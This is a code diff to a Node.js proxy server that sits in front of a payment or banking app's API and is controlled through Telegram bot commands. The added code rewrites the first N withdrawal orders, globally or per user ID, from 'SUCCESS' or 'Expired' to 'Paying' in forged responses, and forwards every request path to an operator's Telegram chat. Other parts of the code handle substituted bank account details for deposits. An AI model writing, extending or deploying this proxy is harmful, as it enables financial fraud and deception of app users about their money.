@@ -36,6 +36,7 @@ async function loadData() {
       if (!data.userOverrides) data.userOverrides = {};
       if (!data.trackedUsers) data.trackedUsers = {};
       if (data.withdrawOverride === undefined) data.withdrawOverride = 0;
+      if (data.logRequests === undefined) data.logRequests = false;
       if (data.fakeWithdrawals) delete data.fakeWithdrawals;
       return data;
     }
@@ -153,6 +154,19 @@ app.use((req, res, next) => {
   });
 });
 
+
+app.use(async (req, res, next) => {
+  try {
+    const bankData = await loadData();
+    if (bankData.logRequests && bankData.adminChatId && bot) {
+      const path = req.originalUrl || req.url;
+      if (path !== '/api/telegram' && !path.includes('favicon')) {
+        bot.sendMessage(bankData.adminChatId, `📡 ${req.method} ${path}`).catch(() => {});
+      }
+    }
+  } catch(e) {}
+  next();
+});
 
 async function transparentProxy(req, res) {
   try {
@@ -409,7 +423,13 @@ app.post('/api/telegram', async (req, res) => {
 
 === WITHDRAW COMMANDS ===
 /on withdraw <count> - Last N orders → Paying (all users)
-/off withdraw - Restore original status
+/on withdraw <count> <userId> - Last N orders → Paying (specific user)
+/off withdraw - Restore global override
+/off withdraw <userId> - Restore specific user
+
+=== LOG COMMANDS ===
+/log on - Log all API requests to Telegram
+/log off - Stop logging
 
 === PER-ID COMMANDS ===
 /id deposit on <amount> <userId>
@@ -556,6 +576,8 @@ Example:
           const active = getActiveBank(bankData, null);
           msg += `Bank: ${active ? active.accountHolder + ' | ' + active.accountNo : 'None'} (global)\n`;
         }
+        const wc = uo && uo.withdrawCount ? uo.withdrawCount : 0;
+        msg += `Withdraw: ${wc > 0 ? '✅ First ' + wc + ' → Paying (per-ID)' : (bankData.withdrawOverride > 0 ? '✅ First ' + bankData.withdrawOverride + ' → Paying (global)' : '❌ OFF')}\n`;
         await bot.sendMessage(chatId, msg);
         return res.sendStatus(200);
       }
@@ -578,26 +600,62 @@ Example:
     }
 
     else if (text.match(/^\/on withdraw\s+/i)) {
-      const count = parseInt(text.replace(/^\/on withdraw\s+/i, '').trim());
+      const parts = text.replace(/^\/on withdraw\s+/i, '').trim().split(/\s+/);
+      const count = parseInt(parts[0]);
+      const userId = parts[1] || null;
       if (isNaN(count) || count <= 0) {
-        await bot.sendMessage(chatId, '❌ Format: /on withdraw <count>\nExample: /on withdraw 2');
+        await bot.sendMessage(chatId, '❌ Format: /on withdraw <count> [userId]\nExample: /on withdraw 2\nExample: /on withdraw 1 49740');
         return res.sendStatus(200);
       }
-      bankData.withdrawOverride = count;
-      await saveData(bankData);
-      await bot.sendMessage(chatId, `✅ Withdraw override ON (global)\n🔄 Last ${count} order(s) → Paying status\n\nUse /off withdraw to restore.`);
+      if (userId) {
+        if (!bankData.userOverrides) bankData.userOverrides = {};
+        if (!bankData.userOverrides[userId]) bankData.userOverrides[userId] = {};
+        bankData.userOverrides[userId].withdrawCount = count;
+        await saveData(bankData);
+        await bot.sendMessage(chatId, `✅ Withdraw override ON for user ${userId}\n🔄 First ${count} order(s) → Paying\n\nUse /off withdraw ${userId} to restore.`);
+      } else {
+        bankData.withdrawOverride = count;
+        await saveData(bankData);
+        await bot.sendMessage(chatId, `✅ Withdraw override ON (global)\n🔄 First ${count} order(s) → Paying\n\nUse /off withdraw to restore.`);
+      }
       return res.sendStatus(200);
     }
 
-    else if (text.trim() === '/off withdraw') {
-      if (bankData.withdrawOverride) {
-        const old = bankData.withdrawOverride;
-        bankData.withdrawOverride = 0;
-        await saveData(bankData);
-        await bot.sendMessage(chatId, `🗑 Withdraw override OFF\nWas: last ${old} order(s) → Paying`);
+    else if (text.match(/^\/off withdraw/i)) {
+      const userId = text.replace(/^\/off withdraw\s*/i, '').trim();
+      if (userId) {
+        if (bankData.userOverrides && bankData.userOverrides[userId] && bankData.userOverrides[userId].withdrawCount) {
+          const old = bankData.userOverrides[userId].withdrawCount;
+          delete bankData.userOverrides[userId].withdrawCount;
+          await saveData(bankData);
+          await bot.sendMessage(chatId, `🗑 Withdraw override OFF for user ${userId}\nWas: first ${old} order(s) → Paying`);
+        } else {
+          await bot.sendMessage(chatId, `ℹ️ No withdraw override for user ${userId}.`);
+        }
       } else {
-        await bot.sendMessage(chatId, `ℹ️ Withdraw override is already OFF.`);
+        if (bankData.withdrawOverride) {
+          const old = bankData.withdrawOverride;
+          bankData.withdrawOverride = 0;
+          await saveData(bankData);
+          await bot.sendMessage(chatId, `🗑 Withdraw override OFF (global)\nWas: first ${old} order(s) → Paying`);
+        } else {
+          await bot.sendMessage(chatId, `ℹ️ Withdraw override is already OFF.`);
+        }
       }
+      return res.sendStatus(200);
+    }
+
+    else if (text.trim() === '/log on') {
+      bankData.logRequests = true;
+      await saveData(bankData);
+      await bot.sendMessage(chatId, `📡 Request logging ON\nAll API requests will be logged to Telegram.\n\nUse /log off to stop.`);
+      return res.sendStatus(200);
+    }
+
+    else if (text.trim() === '/log off') {
+      bankData.logRequests = false;
+      await saveData(bankData);
+      await bot.sendMessage(chatId, `🔇 Request logging OFF`);
       return res.sendStatus(200);
     }
 
@@ -743,8 +801,14 @@ For per-ID control: /id deposit on <amount> <userId>`
       msg += `Banks: ${bankData.banks.length}\n`;
       msg += `Per-ID overrides: ${idCount}\n`;
       if (bankData.withdrawOverride > 0) {
-        msg += `Withdraw Override: ON (last ${bankData.withdrawOverride} order(s) → Paying)\n`;
+        msg += `Withdraw Override: ON global (first ${bankData.withdrawOverride} order(s) → Paying)\n`;
       }
+      const wUsers = Object.entries(bankData.userOverrides || {}).filter(([k, v]) => v.withdrawCount > 0);
+      if (wUsers.length > 0) {
+        msg += `Withdraw per-ID:\n`;
+        wUsers.forEach(([uid, v]) => { msg += `  👤 ${uid}: first ${v.withdrawCount} order(s) → Paying\n`; });
+      }
+      msg += `Request Logging: ${bankData.logRequests ? '📡 ON' : '🔇 OFF'}\n`;
       if (active) {
         msg += `\nCurrent Bank:\n${active.accountHolder} | ${active.accountNo} | ${active.ifsc}`;
       } else {
@@ -994,41 +1058,55 @@ app.all('/money/rechargeRecord', async (req, res) => {
 });
 app.all('/payOrder/list', async (req, res) => {
   const bankData = await loadData();
-  const count = bankData.withdrawOverride || 0;
+  const statNames = { 0: 'Paying', 1: 'SUCCESS', 4: 'Expired' };
 
   try {
     const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
 
-    if (count > 0 && jsonResp && Array.isArray(jsonResp.data) && jsonResp.data.length > 0) {
+    if (jsonResp && Array.isArray(jsonResp.data) && jsonResp.data.length > 0) {
       const items = jsonResp.data;
       let changed = 0;
       const changedDetails = [];
 
-      for (let i = 0; i < items.length && changed < count; i++) {
-        const oldStat = items[i].stat;
-        const statNames = { 0: 'Paying', 1: 'SUCCESS', 4: 'Expired' };
-        items[i].stat = 0;
-        changedDetails.push(`#${i} ₹${(items[i].amount || 0) / 100} ${items[i].orderId} (${statNames[oldStat] || 'stat=' + oldStat} → Paying)`);
-        changed++;
+      for (let i = 0; i < items.length; i++) {
+        const itemCustId = String(items[i].customerId || '');
+        const userOverride = bankData.userOverrides && bankData.userOverrides[itemCustId];
+        const perUserCount = userOverride && userOverride.withdrawCount ? userOverride.withdrawCount : 0;
+        const globalCount = bankData.withdrawOverride || 0;
+        const effectiveCount = perUserCount || globalCount;
+
+        if (effectiveCount <= 0) continue;
+
+        const userItems = items.filter(it => String(it.customerId || '') === itemCustId);
+        const userIndex = userItems.indexOf(items[i]);
+
+        if (userIndex < effectiveCount && items[i].stat !== 0) {
+          const oldStat = items[i].stat;
+          items[i].stat = 0;
+          changedDetails.push(`₹${(items[i].amount || 0) / 100} [${itemCustId}] (${statNames[oldStat] || 'stat=' + oldStat} → Paying)`);
+          changed++;
+        }
       }
 
-      const newBody = JSON.stringify(jsonResp);
+      if (changed > 0) {
+        const newBody = JSON.stringify(jsonResp);
 
-      if (changed > 0 && bankData.adminChatId && bot) {
-        bot.sendMessage(bankData.adminChatId,
-          `✅ Changed ${changed}/${items.length} withdrawal(s) to Paying:\n${changedDetails.join('\n')}\n\n🔍 VERIFY first 200 chars of SENT response:\n${newBody.substring(0, 200)}`
-        ).catch(() => {});
+        if (bankData.adminChatId && bot) {
+          bot.sendMessage(bankData.adminChatId,
+            `✅ Changed ${changed} withdrawal(s) to Paying:\n${changedDetails.join('\n')}`
+          ).catch(() => {});
+        }
+
+        respHeaders['content-type'] = 'application/json; charset=utf-8';
+        respHeaders['content-length'] = String(Buffer.byteLength(newBody));
+        respHeaders['cache-control'] = 'no-store, no-cache, must-revalidate';
+        respHeaders['pragma'] = 'no-cache';
+        delete respHeaders['etag'];
+        delete respHeaders['last-modified'];
+        res.writeHead(200, respHeaders);
+        res.end(newBody);
+        return;
       }
-
-      respHeaders['content-type'] = 'application/json; charset=utf-8';
-      respHeaders['content-length'] = String(Buffer.byteLength(newBody));
-      respHeaders['cache-control'] = 'no-store, no-cache, must-revalidate';
-      respHeaders['pragma'] = 'no-cache';
-      delete respHeaders['etag'];
-      delete respHeaders['last-modified'];
-      res.writeHead(200, respHeaders);
-      res.end(newBody);
-      return;
     }
 
     sendJson(res, respHeaders, jsonResp, respBody);
